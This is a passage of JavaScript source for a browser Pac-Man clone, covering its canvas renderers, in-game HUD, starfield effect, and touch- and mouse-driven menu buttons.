              ctx.fillRect(0, 0, 290, 33),
              ctx.fillRect(0, p, p, 290),
              ctx.fillRect(256, p, 34, 290),
              ctx.fillRect(0, 320, 290, 34),
              ctx.translate(33, 33);
          },
          endFrame: function () {
            ctx.restore(),
              null != this.overlayColor &&
                ((ctx.fillStyle = this.overlayColor),
                ctx.fillRect(0, 0, 290, 354));
          },
          clearMapFrame: function () {
            (ctx.fillStyle = "#000"), ctx.fillRect(-1, -1, 227, 291);
          },
          renderFunc: function (f, that) {
            that ? f.call(that, ctx) : f(ctx);
          },
          drawNoGroutTile: function (ctx, x, y, w) {
            var tileChar = map.getTile(x, y);
            this.drawCenterTileSq(
              ctx,
              x,
              y,
              8,
              map.getTile(x + 1, y) == tileChar,
              map.getTile(x, y + 1) == tileChar,
              map.getTile(x + 1, y + 1) == tileChar
            );
          },
          drawCenterTileSq: function (
            ctx,
            tx,
            ty,
            w,
            rightGrout,
            downGrout,
            downRightGrout
          ) {
            this.drawCenterPixelSq(
              ctx,
              8 * tx + midTile_x,
              8 * ty + midTile_y,
              w,
              rightGrout,
              downGrout,
              downRightGrout
            );
          },
          drawCenterPixelSq: function (
            ctx,
            px,
            py,
            w,
            rightGrout,
            downGrout,
            downRightGrout
          ) {
            ctx.fillRect(px - w / 2, py - w / 2, w, w);
            rightGrout && ctx.fillRect(px - w / 2, py - w / 2, w + 1, w),
              downGrout && ctx.fillRect(px - w / 2, py - w / 2, w, w + 1);
          },
          toggleLevelFlash: function () {
            this.flashLevel = !this.flashLevel;
          },
          setLevelFlash: function (on) {
            on != this.flashLevel && ((this.flashLevel = on), this.drawMap());
          },
          drawTargets: function () {
            var i;
            for (
              ctx.strokeStyle = "rgba(255,255,255,0.5)",
                ctx.lineWidth = "1.5",
                ctx.lineCap = "round",
                ctx.lineJoin = "round",
                i = 0;
              i < 5;
              i++
            )
              actors[i].isDrawTarget && actors[i].drawTarget(ctx);
          },
          drawPaths: function () {
            var i,
              backupAlpha = ctx.globalAlpha;
            for (ctx.globalAlpha = 0.7, i = 0; i < 5; i++)
              actors[i].isDrawPath && this.drawPath(actors[i]);
            ctx.globalAlpha = backupAlpha;
          },
          drawPath: function (actor) {
            if (actor.targetting) {
              var openTiles,
                tile = {
                  x: actor.tile.x,
                  y: actor.tile.y,
                },
                target = actor.targetTile,
                dir = {
                  x: actor.dir.x,
                  y: actor.dir.y,
                },
                dirEnum = actor.dirEnum;
              if (tile.x != target.x || tile.y != target.y) {
                ((0 == dirEnum && actor.tilePixel.y <= midTile_y) ||
                  (2 == dirEnum && actor.tilePixel.y >= midTile_y) ||
                  (1 == dirEnum && actor.tilePixel.x <= midTile_x) ||
                  (3 == dirEnum) & (actor.tilePixel.x >= midTile_x)) &&
                  ((tile.x += dir.x), (tile.y += dir.y));
                var distLeft,
                  pixel = {
                    x: 8 * tile.x + midTile_x,
                    y: 8 * tile.y + midTile_y,
                  },
                  dist = Math.abs(
                    8 * tile.x +
                      midTile_x -
                      actor.pixel.x +
                      8 * tile.y +
                      midTile_y -
                      actor.pixel.y
                  ),
                  maxDist = 8 * actorPathLength;
                if (
                  ((ctx.strokeStyle = actor.pathColor),
                  (ctx.lineWidth = "2.0"),
                  (ctx.lineCap = "round"),
                  (ctx.lineJoin = "round"),
                  ctx.beginPath(),
                  ctx.moveTo(
                    actor.pixel.x + actor.pathCenter.x,
                    actor.pixel.y + actor.pathCenter.y
                  ),
                  ctx.lineTo(
                    pixel.x + actor.pathCenter.x,
                    pixel.y + actor.pathCenter.y
                  ),
                  tile.x == target.x && tile.y == target.y)
                )
                  distLeft = actor.getPathDistLeft(pixel, dirEnum);
                else
                  for (;;) {
                    if (
                      ((openTiles = getOpenTiles(tile, dirEnum)),
                      actor != pacman &&
                        map.constrainGhostTurns &&
                        map.constrainGhostTurns(tile, openTiles, dirEnum),
                      (dirEnum = getTurnClosestToTarget(
                        tile,
                        target,
                        openTiles
                      )),
                      setDirFromEnum(dir, dirEnum),
                      tile.x + dir.x == target.x && tile.y + dir.y == target.y)
                    ) {
                      (distLeft = actor.getPathDistLeft(pixel, dirEnum)),
                        (distLeft = Math.min(maxDist - dist, distLeft));
                      break;
                    }
                    if (dist + 8 > maxDist) {
                      distLeft = maxDist - dist;
                      break;
                    }
                    (tile.x += dir.x),
                      (tile.y += dir.y),
                      (pixel.x += 8 * dir.x),
                      (pixel.y += 8 * dir.y),
                      (dist += 8),
                      ctx.lineTo(
                        8 * tile.x + midTile_x + actor.pathCenter.x,
                        8 * tile.y + midTile_y + actor.pathCenter.y
                      );
                  }
                var px = pixel.x + actor.pathCenter.x + distLeft * dir.x,
                  py = pixel.y + actor.pathCenter.y + distLeft * dir.y;
                ctx.lineTo(px, py);
                1 == dirEnum || 3 == dirEnum
                  ? (ctx.lineTo(px - 3 * dir.x, py + 3 * dir.x),
                    ctx.moveTo(px, py),
                    ctx.lineTo(px - 3 * dir.x, py - 3 * dir.x))
                  : (ctx.lineTo(px + 3 * dir.y, py - 3 * dir.y),
                    ctx.moveTo(px, py),
                    ctx.lineTo(px - 3 * dir.y, py - 3 * dir.y)),
                  ctx.stroke();
              }
            }
          },
          erasePellet: function (x, y) {
            bgCtx.translate(1, 1),
              (bgCtx.fillStyle = this.floorColor),
              this.drawNoGroutTile(bgCtx, x, y, 8),
              " " == map.getTile(x + 1, y) &&
                this.drawNoGroutTile(bgCtx, x + 1, y, 8),
              " " == map.getTile(x - 1, y) &&
                this.drawNoGroutTile(bgCtx, x - 1, y, 8),
              " " == map.getTile(x, y + 1) &&
                this.drawNoGroutTile(bgCtx, x, y + 1, 8),
              " " == map.getTile(x, y - 1) &&
                this.drawNoGroutTile(bgCtx, x, y - 1, 8),
              bgCtx.translate(-1, -1);
          },
          drawMessage: function (text, color, x, y) {
            (ctx.font = "8px ArcadeR"),
              (ctx.textBaseline = "top"),
              (ctx.textAlign = "right"),
              (ctx.fillStyle = color),
              (x += text.length),
              ctx.fillText(text, 8 * x, 8 * y);
          },
          drawReadyMessage: function () {
            this.drawMessage("READY ", "#FF0", 11, 20),
              drawExclamationPoint(ctx, 131, 163);
          },
          drawEatenPoints: function () {
            atlas.drawGhostPoints(
              ctx,
              pacman.pixel.x,
              pacman.pixel.y,
              energizer.getPoints()
            );
          },
          drawActors: function () {
            var i;
            if (energizer.isActive()) {
              for (i = 0; i < 4; i++) this.drawGhost(ghosts[i]);
              energizer.showingPoints()
                ? this.drawEatenPoints()
                : this.drawPlayer();
            } else {
              for (this.drawPlayer(), i = 3; i >= 0; i--)
                ghosts[i].isVisible && this.drawGhost(ghosts[i]);
              inky.isVisible &&
                !blinky.isVisible &&
                this.drawGhost(blinky, 0.5);
            }
          },
        }),
        {
          drawMap: function () {
            var x, y, i;
            for (
              beginMapFrame(),
                bgCtx.fillStyle = this.flashLevel
                  ? this.flashFloorColor
                  : this.floorColor,
                i = 0,
                y = 0;
              y < map.numRows;
              y++
            )
              for (x = 0; x < map.numCols; x++)
                " " == map.currentTiles[i++] &&
                  this.drawNoGroutTile(bgCtx, x, y, 8);
            for (
              bgCtx.fillStyle = this.pelletColor, i = 0, y = 0;
              y < map.numRows;
              y++
            )
              for (x = 0; x < map.numCols; x++)
                "." == map.currentTiles[i++] &&
                  this.drawNoGroutTile(bgCtx, x, y, 8);
            endMapFrame();
          },
          refreshPellet: function (x, y) {
            var i = map.posToIndex(x, y),
              tile = map.currentTiles[i];
            " " == tile
              ? this.erasePellet(x, y)
              : "." == tile &&
                ((bgCtx.fillStyle = this.pelletColor),
                this.drawNoGroutTile(bgCtx, x, y, 8));
          },
          drawScore: function () {
            (ctx.font = "12px sans-serif"),
              (ctx.textBaseline = "top"),
              (ctx.textAlign = "left"),
              (ctx.fillStyle = "#FFF"),
              ctx.fillText(getScore(), 8, 16),
              (ctx.font = "bold 12px sans-serif"),
              (ctx.textBaseline = "top"),
              (ctx.textAlign = "center"),
              ctx.fillText("high score", (8 * map.numCols) / 2, 3),
              ctx.fillText(getHighScore(), (8 * map.numCols) / 2, 16);
          },
          drawExtraLives: function () {
            var i;
            ctx.fillStyle = "rgba(255,255,0,0.6)";
            for (i = 0; i < extraLives; i++)
              this.drawCenterPixelSq(
                ctx,
                8 * (2 * i + 3),
                8 * (map.numRows - 2) + midTile_y,
                this.actorSize
              );
          },
          drawLevelIcons: function () {
            var i;
            ctx.fillStyle = "rgba(255,255,255,0.5)";
            var h = this.actorSize;
            for (i = 0; i < level; i++)
              ctx.fillRect(
                8 * (map.numCols - 2) - 2 * i * 2,
                8 * (map.numRows - 2) + midTile_y - h / 2,
                2,
                h
              );
          },
          drawEnergizers: function () {
            var e, i;
            for (
              ctx.fillStyle = this.energizerColor, i = 0;
              i < map.numEnergizers;
              i++
            )
              (e = map.energizers[i]),
                "o" == map.currentTiles[e.x + e.y * map.numCols] &&
                  this.drawCenterTileSq(ctx, e.x, e.y, this.energizerSize);
          },
          drawPlayer: function (scale, opacity) {
            null == scale && (scale = 1),
              null == opacity && (opacity = 1),
              (ctx.fillStyle = "rgba(255,255,0," + opacity + ")"),
              this.drawCenterPixelSq(
                ctx,
                pacman.pixel.x,
                pacman.pixel.y,
                this.actorSize * scale
              );
          },
          drawDyingPlayer: function (t) {
            var f = 85 * t;
            f <= 60
              ? ((t = f / 60), this.drawPlayer(1 - t))
              : ((t = (f -= 60) / 15), this.drawPlayer(t, 1 - t));
          },
          drawGhost: function (g) {
            if (g.mode != GHOST_EATEN) {
              var color = g.color;
              g.scared
                ? (color = energizer.isFlash() ? "#FFF" : "#2121ff")
                : (g.mode != GHOST_GOING_HOME &&
                    g.mode != GHOST_ENTERING_HOME) ||
                  (color = "rgba(255,255,255,0.3)"),
                (ctx.fillStyle = color),
                this.drawCenterPixelSq(
                  ctx,
                  g.pixel.x,
                  g.pixel.y,
                  this.actorSize
                );
            }
          },
          drawFruit: function () {
            fruit.isPresent()
              ? ((ctx.fillStyle = "#0F0"),
                this.drawCenterPixelSq(ctx, fruit.pixel.x, fruit.pixel.y, 10))
              : fruit.isScorePresent() &&
                ((ctx.font = this.pointsEarnedTextSize + "px sans-serif"),
                (ctx.textBaseline = "middle"),
                (ctx.textAlign = "center"),
                (ctx.fillStyle = "#FFF"),
                ctx.fillText(fruit.getPoints(), fruit.pixel.x, fruit.pixel.y));
          },
        }
      );
      var ArcadeRenderer = function (ctx, bgCtx) {
        CommonRenderer.call(this, ctx, bgCtx),
          (this.messageRow = 20),
          (this.pelletSize = 2),
          (this.energizerSize = 8),
          (this.backColor = "#000"),
          (this.floorColor = "#000"),
          (this.flashWallColor = "#FFF"),
          (this.name = "Arcade");
      };
      (ArcadeRenderer.prototype = newChildObject(CommonRenderer.prototype, {
        blitMap: function () {
          ctx.scale(1 / scale, 1 / scale),
            ctx.drawImage(bgCanvas, -1 - 1 * scale, -1 - 1 * scale),
            ctx.scale(scale, scale);
        },
        drawMap: function (isCutscene) {
          if ((beginMapFrame(), map)) {
            var x, y;
            for (
              state != finishState && (this.flashLevel = !1), i = 0, y = 0;
              y < map.numRows;
              y++
            )
              for (x = 0; x < map.numCols; x++)
                "-" == map.currentTiles[i] &&
                  "-" == map.currentTiles[i + 1] &&
                  ((bgCtx.fillStyle = "#ffb8de"),
                  bgCtx.fillRect(8 * x, 8 * y + 8 - 2, 16, 2)),
                  i++;
            for (
              this.flashLevel
                ? ((bgCtx.fillStyle = "#000"), (bgCtx.strokeStyle = "#fff"))
                : ((bgCtx.fillStyle = map.wallFillColor),
                  (bgCtx.strokeStyle = map.wallStrokeColor)),
                i = 0;
              i < map.paths.length;
              i++
            ) {
              var path = map.paths[i];
              for (
                bgCtx.beginPath(), bgCtx.moveTo(path[0].x, path[0].y), j = 1;
                j < path.length;
                j++
              )
                null != path[j].cx
                  ? bgCtx.quadraticCurveTo(
                      path[j].cx,
                      path[j].cy,
                      path[j].x,
                      path[j].y
                    )
                  : bgCtx.lineTo(path[j].x, path[j].y);
              bgCtx.quadraticCurveTo(
                path[j - 1].x,
                path[0].y,
                path[0].x,
                path[0].y
              ),
                bgCtx.fill(),
                bgCtx.stroke();
            }
            for (
              bgCtx.fillStyle = map.pelletColor, i = 0, y = 0;
              y < map.numRows;
              y++
            )
              for (x = 0; x < map.numCols; x++) this.refreshPellet(x, y, !0);
            if ((map.onDraw && map.onDraw(bgCtx), map.shouldDrawMapOnly))
              return void endMapFrame();
          }
          if (level > 0) {
            if (!isCutscene) {
              (bgCtx.fillStyle = pacman.color),
                bgCtx.save(),
                bgCtx.translate(24, 280),
                bgCtx.scale(0.85, 0.85);
              var lives = extraLives == 1 / 0 ? 1 : extraLives;
              if (0 == gameMode)
                for (i = 0; i < lives; i++)
                  drawPacmanSprite(bgCtx, 0, 0, 1, Math.PI / 6),
                    bgCtx.translate(16, 0);
              else if (1 == gameMode)
                for (i = 0; i < lives; i++)
                  drawMsPacmanSprite(bgCtx, 0, 0, 3, 1), bgCtx.translate(16, 0);
              else if (2 == gameMode)
                for (i = 0; i < lives; i++)
                  drawCookiemanSprite(bgCtx, 0, 0, 3, 1, !1),
                    bgCtx.translate(16, 0);
              else if (3 == gameMode)
                for (i = 0; i < lives; i++)
                  drawOttoSprite(bgCtx, 0, 0, 3, 0), bgCtx.translate(16, 0);
              if (extraLives == 1 / 0) {
                bgCtx.translate(-32, 0);
                bgCtx.beginPath(),
                  bgCtx.moveTo(-5, 0),
                  bgCtx.quadraticCurveTo(-5, -2, -3, -2),
                  bgCtx.bezierCurveTo(-1, -2, 1, 2, 3, 2),
                  bgCtx.quadraticCurveTo(5, 2, 5, 0),
                  bgCtx.quadraticCurveTo(5, -2, 3, -2),
                  bgCtx.bezierCurveTo(1, -2, -1, 2, -3, 2),
                  bgCtx.quadraticCurveTo(-5, 2, -5, 0),
                  (bgCtx.lineWidth = 1),
                  (bgCtx.strokeStyle = "#FFF"),
                  bgCtx.stroke();
              }
              bgCtx.restore();
            }
            var i,
              j,
              f,
              drawFunc,
              fruits = fruit.fruitHistory,
              startLevel = Math.max(7, level);
            0 != gameMode && (startLevel = Math.min(7, startLevel));
            for (i = 0, j = startLevel - 7 + 1; i < 7 && j <= level; j++, i++)
              (f = fruits[j]) &&
                (drawFunc = getSpriteFuncFromFruitName(f.name)) &&
                (bgCtx.save(),
                bgCtx.translate(200 - 16 * i * 0.85, 280),
                bgCtx.scale(0.85, 0.85),
                drawFunc(bgCtx, 0, 0),
                bgCtx.restore());
            isCutscene ||
              ((bgCtx.font = level >= 100 ? "5px ArcadeR" : "7px ArcadeR"),
              (bgCtx.textBaseline = "middle"),
              (bgCtx.fillStyle = "#777"),
              (bgCtx.textAlign = "left"),
              bgCtx.fillText(level, 208, 280));
          }
          endMapFrame();
        },
        erasePellet: function (x, y, isTranslated) {
          isTranslated || bgCtx.translate(1, 1), (bgCtx.fillStyle = "#000");
          var i = map.posToIndex(x, y),
            size = "o" == map.tiles[i] ? this.energizerSize : this.pelletSize;
          this.drawCenterTileSq(bgCtx, x, y, size + 2),
            isTranslated || bgCtx.translate(-1, -1);
        },
        refreshPellet: function (x, y, isTranslated) {
          isTranslated || bgCtx.translate(1, 1);
          var i = map.posToIndex(x, y),
            tile = map.currentTiles[i];
          " " == tile
            ? this.erasePellet(x, y, isTranslated)
            : "." == tile
            ? ((bgCtx.fillStyle = map.pelletColor),
              bgCtx.translate(0.5, 0.5),
              this.drawCenterTileSq(bgCtx, x, y, this.pelletSize),
              bgCtx.translate(-0.5, -0.5))
            : "o" == tile &&
              ((bgCtx.fillStyle = map.pelletColor),
              bgCtx.beginPath(),
              bgCtx.arc(
                8 * x + midTile_x + 0.5,
                8 * y + midTile_y,
                this.energizerSize / 2,
                0,
                2 * Math.PI
              ),
              bgCtx.fill()),
            isTranslated || bgCtx.translate(-1, -1);
        },
        drawScore: function () {
          (ctx.font = "8px ArcadeR"),
            (ctx.textBaseline = "top"),
            (ctx.fillStyle = "#FFF"),
            (ctx.textAlign = "right"),
            ctx.fillText("1UP", 48, 0),
            ctx.fillText(practiceMode ? "PRACTICE" : "HIGH SCORE", 152, 0);
          var score = getScore();
          0 == score && (score = "00");
          if ((ctx.fillText(score, 56, 9), !practiceMode)) {
            var highScore = getHighScore();
            0 == highScore && (highScore = "00"),
              ctx.fillText(highScore, 136, 9);
          }
        },
        drawGhost: function (g, alpha) {
          var backupAlpha;
          alpha && ((backupAlpha = ctx.globalAlpha), (ctx.globalAlpha = alpha));
          var draw = function (
            mode,
            pixel,
            frames,
            faceDirEnum,
            scared,
            isFlash,
            color,
            dirEnum
          ) {
            if (mode != GHOST_EATEN) {
              var frame = g.getAnimFrame(frames),
                eyes = mode == GHOST_GOING_HOME || mode == GHOST_ENTERING_HOME,
                func = getGhostDrawFunc(),
                y = g.getBounceY(pixel.x, pixel.y, dirEnum),
                x = g == blinky && scared ? pixel.x + 1 : pixel.x;
              func(ctx, x, y, frame, faceDirEnum, scared, isFlash, eyes, color);
            }
          };
          vcr.drawHistory(ctx, function (t) {
            draw(
              g.savedMode[t],
              g.savedPixel[t],
              g.savedFrames[t],
              g.savedFaceDirEnum[t],
              g.savedScared[t],
              energizer.isFlash(),
              g.color,
              g.savedDirEnum[t]
            );
          }),
            draw(
              g.mode,
              g.pixel,
              g.frames,
              g.faceDirEnum,
              g.scared,
              energizer.isFlash(),
              g.color,
              g.dirEnum
            ),
            alpha && (ctx.globalAlpha = backupAlpha);
        },
        drawPlayer: function () {
          pacman.getAnimFrame();
          pacman.invincible && (ctx.globalAlpha = 0.6);
          var draw = function (pixel, dirEnum, steps) {
            var frame = pacman.getAnimFrame(pacman.getStepFrame(steps));
            getPlayerDrawFunc()(ctx, pixel.x, pixel.y, dirEnum, frame, !0);
          };
          vcr.drawHistory(ctx, function (t) {
            draw(
              pacman.savedPixel[t],
              pacman.savedDirEnum[t],
              pacman.savedSteps[t]
            );
          }),
            draw(pacman.pixel, pacman.dirEnum, pacman.steps),
            pacman.invincible && (ctx.globalAlpha = 1);
        },
        drawDyingPlayer: function (t) {
          var frame = pacman.getAnimFrame();
          if (0 == gameMode) {
            var f = 75 * t;
            if (f <= 60) {
              t = f / 60;
              var a = (frame * Math.PI) / 6;
              drawPacmanSprite(
                ctx,
                pacman.pixel.x,
                pacman.pixel.y,
                pacman.dirEnum,
                a + t * (Math.PI - a),
                4 * t
              );
            } else (f -= 60), this.drawExplodingPlayer(f / 15);
          } else if (3 == gameMode) {
            if (t < 0.8)
              (dirEnum = Math.floor(pacman.dirEnum - 16 * t) % 4) < 0 &&
                (dirEnum += 4),
                drawOttoSprite(ctx, pacman.pixel.x, pacman.pixel.y, dirEnum, 0);
            else if (t < 0.95) {
              var dirEnum;
              (dirEnum = Math.floor(pacman.dirEnum - 12.8) % 4) < 0 &&
                (dirEnum += 4),
                drawOttoSprite(ctx, pacman.pixel.x, pacman.pixel.y, dirEnum, 0);
            } else drawDeadOttoSprite(ctx, pacman.pixel.x, pacman.pixel.y);
          } else if (1 == gameMode) {
            var maxAngle = 5 * Math.PI,
              step = Math.PI / 4 / maxAngle,
              angle = Math.floor(t / step) * step * maxAngle;
            drawMsPacmanSprite(
              ctx,
              pacman.pixel.x,
              pacman.pixel.y,
              pacman.dirEnum,
              frame,
              angle
            );
          } else if (2 == gameMode) {
            (maxAngle = 5 * Math.PI),
              (step = Math.PI / 4 / maxAngle),
              (angle = Math.floor(t / step) * step * maxAngle);
            drawCookiemanSprite(
              ctx,
              pacman.pixel.x,
              pacman.pixel.y,
              pacman.dirEnum,
              frame,
              !1,
              angle
            );
          }
        },
        drawExplodingPlayer: function (t) {
          pacman.getAnimFrame();
          drawPacmanSprite(
            ctx,
            pacman.pixel.x,
            pacman.pixel.y,
            pacman.dirEnum,
            0,
            0,
            t,
            -3,
            1 - t
          );
        },
        drawFruit: function () {
          if (fruit.getCurrentFruit()) {
            var name = fruit.getCurrentFruit().name;
            fruit.savedPixel &&
              vcr.drawHistory(ctx, function (t) {
                var pixel = fruit.savedPixel[t];
                pixel && atlas.drawFruitSprite(ctx, pixel.x, pixel.y, name);
              }),
              fruit.isPresent()
                ? atlas.drawFruitSprite(ctx, fruit.pixel.x, fruit.pixel.y, name)
                : fruit.isScorePresent() &&
                  (0 == gameMode
                    ? atlas.drawPacFruitPoints(
                        ctx,
                        fruit.pixel.x,
                        fruit.pixel.y,
                        fruit.getPoints()
                      )
                    : atlas.drawMsPacFruitPoints(
                        ctx,
                        fruit.pixel.x,
                        fruit.pixel.y,
                        fruit.getPoints()
                      ));
          }
        },
      })),
        (renderer_list = [new SimpleRenderer(), new ArcadeRenderer()]),
        (renderer = renderer_list[1]);
    },
    hud =
      ((on = !1),
      {
        update: function () {
          var valid = this.isValidState();
          valid != on &&
            ((on = valid)
              ? (inGameMenu.onHudEnable(), vcr.onHudEnable())
              : (inGameMenu.onHudDisable(), vcr.onHudDisable()));
        },
        draw: function (ctx) {
          inGameMenu.draw(ctx), vcr.draw(ctx);
        },
        isValidState: function () {
          return (
            state == playState ||
            state == newGameState ||
            state == readyNewState ||
            state == readyRestartState ||
            state == finishState ||
            state == deadState ||
            state == overState
          );
        },
      }),
    galagaStars =
      ((stars = {}),
      (height = Math.floor(435)),
      {
        init: function () {
          var i;
          for (t = 0, ypos = 0, i = 0; i < 200; i++)
            stars[i] = {
              x: getRandomInt(0, 225),
              y: getRandomInt(0, height - 1),
              color:
                "#" +
                (
                  "00000" + ((Math.random() * (1 << 24)) | 0).toString(16)
                ).slice(-6),
              phase: getRandomInt(0, 119),
            };
        },
        draw: function (ctx) {
          var i, star, y;
          for (ctx.fillStyle = "#FFF", i = 0; i < 200; i++)
            (star = stars[i]),
              (t + star.phase) % 120 >= 30 &&
                ((y = star.y - ypos) < 0 && (y += height),
                (ctx.fillStyle = star.color),
                ctx.fillRect(star.x, y, 1, 1));
        },
        update: function () {
          t++,
            (t %= 120),
            (ypos += -0.5),
            (ypos %= height) < 0 && (ypos += height);
        },
      }),
    getPointerPos = function (evt) {
      for (var obj = canvas, top = 0, left = 0; "BODY" != obj.tagName; )
        (top += obj.offsetTop),
          (left += obj.offsetLeft),
          (obj = obj.offsetParent);
      var mouseX = evt.pageX - left,
        mouseY = evt.pageY - top;
      return (
        (mouseX /= renderScale / 1),
        (mouseY /= renderScale / 1),
        {
          x: (mouseX -= 32),
          y: (mouseY -= 32),
        }
      );
    },
    Button = function (x, y, w, h, onclick) {
      (this.x = x),
        (this.y = y),
        (this.w = w),
        (this.h = h),
        (this.onclick = onclick),
        (this.pad = 8),
        (this.frame = 0),
        (this.borderBlurColor = "#333"),
        (this.borderFocusColor = "#EEE"),
        (this.isSelected = !1),
        (this.startedInside = !1);
      var that = this,
        touchstart = function (evt) {
          if ((evt.preventDefault(), 1 == evt.touches.length)) {
            var pos = getPointerPos(evt.touches[0]);
            (that.startedInside = that.contains(pos.x, pos.y))
              ? that.focus()
              : that.blur();
          } else touchcancel(evt);
        },
        touchmove = function (evt) {
          if ((evt.preventDefault(), 1 == evt.touches.length)) {
            if (that.startedInside) {
              var pos = getPointerPos(evt.touches[0]);
              that.contains(pos.x, pos.y) ? that.focus() : that.blur();
            }
          } else touchcancel(evt);
        },
        touchend = function (evt) {
          evt.preventDefault();
          var registerClick = that.startedInside && that.isSelected;
          registerClick && that.click(),
            touchcancel(evt),
            registerClick && that.focus();
        },
        touchcancel = function (evt) {
          evt.preventDefault(), (this.startedInside = !1), that.blur();
        },
        click = function (evt) {
          var pos = getPointerPos(evt);
          that.contains(pos.x, pos.y) && that.click();
        },
        mousemove = function (evt) {
          var pos = getPointerPos(evt);
          that.contains(pos.x, pos.y) ? that.focus() : that.blur();
        },
        mouseleave = function (evt) {
          that.blur();
        };
      (this.isEnabled = !1),
        (this.onEnable = function () {
          canvas.addEventListener("click", click),
            canvas.addEventListener("mousemove", mousemove),
            canvas.addEventListener("mouseleave", mouseleave),
            canvas.addEventListener("touchstart", touchstart),
            canvas.addEventListener("touchmove", touchmove),
            canvas.addEventListener("touchend", touchend),
            canvas.addEventListener("touchcancel", touchcancel),
            (this.isEnabled = !0);
        }),
        (this.onDisable = function () {
          canvas.removeEventListener("click", click),
            canvas.removeEventListener("mousemove", mousemove),
            canvas.removeEventListener("mouseleave", mouseleave),
            canvas.removeEventListener("touchstart", touchstart),
            canvas.removeEventListener("touchmove", touchmove),
            canvas.removeEventListener("touchend", touchend),
            canvas.removeEventListener("touchcancel", touchcancel),
            that.blur(),
            (this.isEnabled = !1);
        });
    },
    ToggleButton = function (x, y, w, h, isOn, setOn) {
      var that = this;
      (this.isOn = isOn),
        (this.setOn = setOn),
        Button.call(this, x, y, w, h, function () {
          setOn(!isOn()), that.refreshMsg();
        });
    };
  ToggleButton.prototype = newChildObject(
    (Button.prototype = {
      contains: function (x, y) {
        return (
          x >= this.x &&
          x <= this.x + this.w &&
          y >= this.y &&
          y <= this.y + this.h
        );
      },
      click: function () {
        clearTimeout(this.clickTimeout);
        var that = this;
        that.onclick &&
          (this.clickTimeout = setTimeout(function () {
            that.onclick();
          }, 200)),
          console.log(this.msg),
          (this.msg && "BACK" == this.msg) || "YES" == this.msg
            ? (document.getElementById("about-game").style = "display: block")
            : (document.getElementById("about-game").style = "display: none");
      },
      enable: function () {
        (this.frame = 0), this.onEnable();
      },
      disable: function () {
        this.onDisable();
      },
      focus: function () {
        (this.isSelected = !0), this.onfocus && this.onfocus();
      },
      blur: function () {
        (this.isSelected = !1), this.onblur && this.onblur();
      },
      setText: function (msg) {
        this.msg = msg;
      },
      setFont: function (font, fontcolor) {
        (this.font = font), (this.fontcolor = fontcolor);
      },
      setIcon: function (drawIcon) {
        this.drawIcon = drawIcon;
      },
      draw: function (ctx) {
        (ctx.lineWidth = 2), ctx.beginPath();
        var x = this.x,
          y = this.y,
          w = this.w,
          h = this.h,
          r = h / 4;
        ctx.moveTo(x, y + r),
          ctx.quadraticCurveTo(x, y, x + r, y),
          ctx.lineTo(x + w - r, y),
          ctx.quadraticCurveTo(x + w, y, x + w, y + r),
          ctx.lineTo(x + w, y + h - r),
          ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h),
          ctx.lineTo(x + r, y + h),
          ctx.quadraticCurveTo(x, y + h, x, y + h - r),
          ctx.closePath(),
          (ctx.fillStyle = "rgba(0,0,0,0.5)"),
          ctx.fill(),
          (ctx.strokeStyle =
            this.isSelected && this.onclick
              ? this.borderFocusColor
              : this.borderBlurColor),
          ctx.stroke(),
          this.drawIcon &&
            (this.msg
              ? this.drawIcon(
                  ctx,
                  this.x + this.pad + 8,
                  this.y + this.h / 2,
                  this.frame
                )
              : this.drawIcon(
                  ctx,
                  this.x + this.w / 2,
                  this.y + this.h / 2,
                  this.frame
                )),
          this.msg &&
            ((ctx.font = this.font),
            (ctx.fillStyle =
              this.isSelected && this.onclick ? this.fontcolor : "#777"),
            (ctx.textBaseline = "middle"),
            (ctx.textAlign = "center"),
            ctx.fillText(
              this.msg,
              this.x + this.w / 2,
              this.y + this.h / 2 + 1
            ));
      },
      update: function () {
        this.drawIcon && (this.frame = this.isSelected ? this.frame + 1 : 0);
      },
    }),
    {
      enable: function () {
        Button.prototype.enable.call(this), this.refreshMsg();
      },
      setToggleLabel: function (label) {
        this.label = label;
      },
      refreshMsg: function () {
        this.label &&
          (this.msg = this.label + ": " + (this.isOn() ? "ON" : "OFF"));
      },
      refreshOnState: function () {
        this.setOn(this.isOn());
      },
    }
  );
  var Menu = function (title, x, y, w, h, pad, font, fontcolor) {
    (this.title = title),
      (this.x = x),
      (this.y = y),
      (this.w = w),
      (this.h = h),
      (this.pad = pad),
      (this.buttons = []),
      (this.buttonCount = 0),
      (this.currentY = this.y + this.pad),
      title && (this.currentY += 1 * (this.h + this.pad)),
      (this.font = font),
      (this.fontcolor = fontcolor),
      (this.enabled = !1),
      (this.backButton = void 0);
  };
  Menu.prototype = {
    clickCurrentOption: function () {
      var i;
      for (i = 0; i < this.buttonCount; i++)
        if (this.buttons[i].isSelected) {
          this.buttons[i].onclick();
          break;
        }
    },
    selectNextOption: function () {
      var i, nextBtn;
      for (i = 0; i < this.buttonCount; i++)
        if (this.buttons[i].isSelected) {
          this.buttons[i].blur(),
            (nextBtn = this.buttons[(i + 1) % this.buttonCount]);
          break;
        }
      (nextBtn = nextBtn || this.buttons[0]).focus();
    },
    selectPrevOption: function () {
      var i, nextBtn;
      for (i = 0; i < this.buttonCount; i++)
        if (this.buttons[i].isSelected) {
          this.buttons[i].blur(),
            (nextBtn = this.buttons[0 == i ? this.buttonCount - 1 : i - 1]);
          break;
        }
      (nextBtn = nextBtn || this.buttons[this.buttonCount - 1]).focus();
    },
    addToggleButton: function (isOn, setOn) {
      var b = new ToggleButton(
        this.x + this.pad,
        this.currentY,
        this.w - 2 * this.pad,
        this.h,
        isOn,
        setOn
      );
      this.buttons.push(b),
        this.buttonCount++,
        (this.currentY += this.pad + this.h);
    },
    addToggleTextButton: function (label, isOn, setOn) {
      var b = new ToggleButton(
        this.x + this.pad,
        this.currentY,
        this.w - 2 * this.pad,
        this.h,
        isOn,
        setOn
      );
      b.setFont(this.font, this.fontcolor),
        b.setToggleLabel(label),
        this.buttons.push(b),
        this.buttonCount++,
        (this.currentY += this.pad + this.h);
    },
    addTextButton: function (msg, onclick) {
      var b = new Button(
        this.x + this.pad,
        this.currentY,
        this.w - 2 * this.pad,
        this.h,
        onclick
      );
      b.setFont(this.font, this.fontcolor),
        b.setText(msg),
        this.buttons.push(b),
        this.buttonCount++,
        (this.currentY += this.pad + this.h);
    },
    addTextIconButton: function (msg, onclick, drawIcon) {
      var b = new Button(
        this.x + this.pad,
        this.currentY,
        this.w - 2 * this.pad,
        this.h,
        onclick
      );
      b.setFont(this.font, this.fontcolor),
        b.setText(msg),
        b.setIcon(drawIcon),
        this.buttons.push(b),
